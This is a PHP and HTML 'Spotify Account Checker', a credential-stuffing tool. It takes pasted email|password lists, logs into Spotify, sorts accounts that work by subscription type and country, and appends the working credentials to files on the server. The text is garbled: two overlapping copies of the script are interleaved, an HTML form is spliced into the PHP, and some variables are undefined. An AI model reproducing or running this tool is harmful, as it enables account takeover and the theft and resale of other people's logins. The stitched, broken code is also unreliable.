<?php
date_default_timezone_set("Asia/Kuala_Lumpur");
$date= date("dmy_Hi");
$s_check = urldecode($_REQUEST['delim']);
$s_enailpass = explode($delim, urldecode($_REQUEST['s_enailpass']));
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_VERBOSE, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
      ));
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
      $res = curl_exec($ch);
      preg_match_all("|Set-Cookie: csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $res, $csrf);
      $csrf = trim($csrf[1][0]);

      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Content-Type: application/x-www-form-urlencoded",
            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
      ));
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$pisah[0]&password=$pisah[1]&csrf_token=$csrf");
      $res = curl_exec($ch);
      $res = json_decode($res);
      $email = urldecode($pisah[0]);
      if(isset($res->error) && trim($res->error) == "errorInvalidCredentials" ) {
      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$pisah[0].'<font color=gray>|</font>'.$pisah[1].'"}';
      } elseif(isset($res->displayName) || stripos($json_encode($res), "displayName")) {
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));<?php
date_default_timezone_set("Asia/Kuala_Lumpur");
$date= date("dmy_Hi");
$s_check = urldecode($_REQUEST['s_check']);
$s_enailpass = explode($s_check, urldecode($_REQUEST['mailpass']));
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_VERBOSE, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
      ));
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
      $r_check = curl_exec($ch);
      preg_match_all("|Set-Cookie: i_check_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $r_check, $i_check);
      $i_check = trim($i_check[1][0]);

      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Content-Type: application/x-www-form-urlencoded",
            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; i_check_token=$i_check; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
      ));
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$s_enailpass[0]&password=$s_enailpass[1]&i_check_token=$i_check");<head title="Priv Network">
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Spotify Account Checker</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:image" content="img/icon.png"/>
	<meta http-equiv="expires" content="0">
	<meta http-equiv="Content-Language" content="en-us">
	<link rel="shortcut icon" href="img/IniNamanyaPedang_BuatCydukRipperhwhwhwhwh.png" type="image/x-icon" />
	<meta name="distribution" content="Global">
	<meta name="rating" content="General">
	<link rel="stylesheet" type="text/css" href="css/sweetalert.css">
	<link href="css/bootstrap.css" rel="stylesheet">
	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/bootstrap-theme.css" rel="stylesheet">
	<link href="css/bootstrap-theme.min.css" rel="stylesheet">
</head>
<body>
	<nav class="navbar navbar-default">
		<div class="container-fluid">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
					<span class="sr-only"> Toggle navigation </span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a class="navbar-brand" href="/">
						<font style="font-family: Kristen ITC;">Unc3ns0r3d</font></a>
					</div>
					<div id="navbar" class="navbar-collapse collapse">
						<ul class="nav navbar-nav navbar-right">
							<li class="active">
								<a href="#">Inicio</a>
							</li>
						</ul>
					</nav>
				</nav>
				<div class="panel-heading">
					<div class="panel panel-primary panelMove toggle panelRefresh panelClose">
						<div class="panel-heading">
							<h4 class="panel-title">Spotify Account Checker</h4>
						</div>
						<div class="panel-body">
<div>
	<label for="mailpass" class="control-label">List E-mail|Password:</label>
	<textarea name="mailpass" id="mailpass" class="form-control" rows="7" placeholder="test@email.com|123456"></textarea>
	<input name="delim" id="delim" style="text-align: center;display: none;width: 40px;margin-right: 5px;padding: 4px;" value="|" type="text" class="form-control">
	<br>
	<button type="button" class="btn btn-success" id="submit">Chequear</button> 
	<button type="button" class="btn btn-danger" id="stop">Parar</button>&nbsp;
	<img id="loading">
	<span class="pull-right">
		<span id="checkStatus" style="color:limegreen"></span></span>
	</div>
</div>
</div>
<div id="result">
	<div class="panel panel-default">
		<div class="panel-heading">
			<i class="icon-list-ul"></i>
			<span>LIVE </span>
			<span class="label label-success" id="acc_live_count" style="color:white">0</span>
		</div>
		<div class="panel-body">
			<div id="acc_live">
				
			</div>
		</div>
	</div>
</div>
<div class="panel panel-default">
	<div class="panel-heading">
		<i class="icon-list-ul"></i>
		<span>DIE </span>
		<span class="label label-danger" id="acc_die_count" style="color:white">0</span>
	</div>
	<div class="panel-body">
		<div id="acc_die">
			
		</div>
	</div>
</div>
<div class="panel panel-default">
	<div class="panel-heading">
		<i class="icon-list-ul"></i>
		<span>WRONG </span>
		<span class="label label-danger" id="wrong_count" style="color:white">0</span>
	</div>
	<div class="panel-body">
		<div id="wrong">
			
		</div>
	</div>
</div>
</div>
</div>
<script type="text/javascript" src="js/jquery.js">
</script>
<script type="text/javascript" src="js/jquery-ui.js">
</script>
<script type="text/javascript" src="js/jsEmailPassword.js">
</script>
<script type="text/javascript" src="js/sweetalert.min.js">
</script>
</body>
      $r_check = curl_exec($ch);
      $r_check = json_decode($r_check);
      $email = urldecode($s_enailpass[0]);
      if(isset($r_check->error) && trim($r_check->error) == "errorInvalidCredentials" ) {
      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$s_enailpass[0].'<font color=gray>|</font>'.$s_enailpass[1].'"}';
      } elseif(isset($r_check->displayName) || stripos($json_encode($r_check), "displayName")) {
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));
            $r_check = curl_exec($ch);
            preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $r_check, $acc_premium);
            preg_match_all('|<h3 class="product-name">(.*)</h3>|', $r_check, $acc_free);
            preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $r_check, $country);
            if(trim($acc_premium[1][0]) == "Spotify Premium") { 
                  $status = "<font color='blue'>acc_premium</font>"; 
            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);

            } elseif(trim($acc_premium[1][0]) == "Premium for Family") {
                  $status = "<font color='gold'>Admin Family</font>";
            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);

            } elseif(trim($acc_free[1][0]) == "Spotify Free") {
                  $status = "<font color='red'>acc_free</font>";
            file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);
            }
            $country = $country[1][0];
            $r_checkult["error"] = 0;
            $r_checkult["msg"] = "<font color=green><b>Live</b></font> | $s_enailpass[0] | $s_enailpass[1] | Type : $status | Country : $country | [ Acc : Spotify ]";
      
            $a = fopen('priv/acc_ok', 'a+');
            @fwrite($a, $r_checkult["msg"]."<br>");
            @fclose($a);
            die(json_encode($r_checkult));
            //          echo '{"error":0,"msg":"<div class=col-md-4><b><font color=green>LIVE</font></b></div> <div class=col-md-4>'.$s_enailpass[0].'|'.$s_enailpass[1].'</div><div class=col-md-4>Type:  <b>'.$status.'</b></div>"}';

      }



?> 
            $res = curl_exec($ch);
            preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $res, $premium);
            preg_match_all('|<h3 class="product-name">(.*)</h3>|', $res, $free);
            preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $res, $country);
            if(trim($premium[1][0]) == "Spotify Premium") { 
                  $status = "<font color='blue'>Premium</font>"; 
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);

            } elseif(trim($premium[1][0]) == "Premium for Family") {
                  $status = "<font color='gold'>Admin Family</font>";
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);

            } elseif(trim($free[1][0]) == "Spotify Free") {
                  $status = "<font color='red'>Free</font>";
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);
            }
            $country = $country[1][0];
            $result["error"] = 0;
            $result["msg"] = "<font color=green><b>Live</b></font> | $pisah[0] | $pisah[1] | Type : $status | Country : $country | [ Acc : Spotify ]";
      
            $a = fopen('priv/ddcode.html', 'a+');
            @fwrite($a, $result["msg"]."<br>");
            @fclose($a);
            die(json_encode($result));
            //          echo '{"error":0,"msg":"<div class=col-md-4><b><font color=green>LIVE</font></b></div> <div class=col-md-4>'.$pisah[0].'|'.$pisah[1].'</div><div class=col-md-4>Type:  <b>'.$status.'</b></div>"}';

      }



?> 
